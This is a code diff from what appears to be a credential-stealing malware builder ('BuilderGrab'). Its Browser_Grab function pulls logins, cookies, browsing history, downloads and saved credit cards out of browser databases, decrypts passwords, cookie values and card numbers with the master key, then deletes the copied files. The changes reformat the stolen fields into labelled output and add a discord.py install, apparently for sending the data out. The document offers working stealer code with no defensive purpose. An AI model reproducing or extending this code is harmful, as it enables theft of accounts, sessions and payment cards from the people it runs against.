@@ -970,8 +970,10 @@ def Browser_Grab():
                 if not row[0] or not row[1] or not row[2]:
                     continue
 
-                password = self.decrypt_password(row[2], self.master_key)
-                __LOGINS__.append(Types.Login(row[0], row[1], password))
+                url = f"- [+] |URL|: {row[0]}"
+                username = f"   |USERNAME|: {row[1]}"
+                password = f"   |PASSWORD|: {self.decrypt_password(row[2], self.master_key)}"
+                __LOGINS__.append(Types.Login(url, username, password))
 
             conn.close()
             os.remove('login_db')
@@ -990,14 +992,16 @@ def Browser_Grab():
                 for row in cursor.fetchall():
                     if not row[0] or not row[1] or not row[2] or not row[3]:
                         continue
+                    url = f"- [+] |URL|: {row[0]}"
+                    name = f"  |NAME|: {row[1]}"
+                    path = f"  |PATH|: {row[2]}"
+                    cookie = f"  |COOKIE|: {self.decrypt_password(row[3], self.master_key)}"
+                    expire = f"  |EXPIRE|: {row[4]}"
 
-                    cookie = self.decrypt_password(row[3], self.master_key)
-                    __COOKIES__.append(Types.Cookie(
-                        row[0], row[1], row[2], cookie, row[4]))
-
+                    __COOKIES__.append(Types.Cookie(url, name, path, cookie, expire))
                 conn.close()
             except:
-                print()
+                ()
 
             os.remove('cookie_db')
 
@@ -1013,8 +1017,10 @@ def Browser_Grab():
             for row in cursor.fetchall():
                 if not row[0] or not row[1] or not row[2]:
                     continue
-
-                __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))
+                url = f"- [+] |URL|: {row[0]}"
+                title = f"  |TITLE|: {row[1]}"
+                time = f"  |TIME|: {row[2]}"
+                __WEB_HISTORY__.append(Types.WebHistory(url, title, time))
 
             conn.close()
             os.remove('web_history_db')
@@ -1031,8 +1037,10 @@ def Browser_Grab():
             for row in cursor.fetchall():
                 if not row[0] or not row[1]:
                     continue
-
-                __DOWNLOADS__.append(Types.Download(row[0], row[1]))
+                
+                path = f"- [+] |PATH|: {row[1]}"
+                url = f"  |URL|: {row[0]}"
+                __DOWNLOADS__.append(Types.Download(path, url))
 
             conn.close()
             os.remove('downloads_db')
@@ -1050,10 +1058,12 @@ def Browser_Grab():
             for row in cursor.fetchall():
                 if not row[0] or not row[1] or not row[2] or not row[3]:
                     continue
-
-                card_number = self.decrypt_password(row[3], self.master_key)
-                __CARDS__.append(Types.CreditCard(
-                    row[0], row[1], row[2], card_number, row[4]))
+                name = f"- [+] |NAME|: {row[0]}"
+                expiration_month = f"  |EXPIRATION MOUNTH|: {row[1]}"
+                expiration_year = f"  |EXPIRATION YEAR|: {row[2]}"
+                card_number = f"  |CARD NUMBER|: {self.decrypt_password(row[3], self.master_key)}"
+                date_modified = f"  |DATE MODIFIED|: {row[4]}"
+                __CARDS__.append(Types.CreditCard(name, expiration_month, expiration_year, card_number, date_modified))
 
             conn.close()
             os.remove('cards_db')
@@ -1488,6 +1498,8 @@ file_python = f'./Settings/Program/BuilderGrab/{name_file}.py'
 path_destination = "./1-File-Create"
 
 print(f"{color.RED}\n[!] | Installing missing modules:{color.RESET}")
+
+subprocess.check_call(['pip', 'install', '--upgrade', 'discord.py'])
 
 try:
    import platform
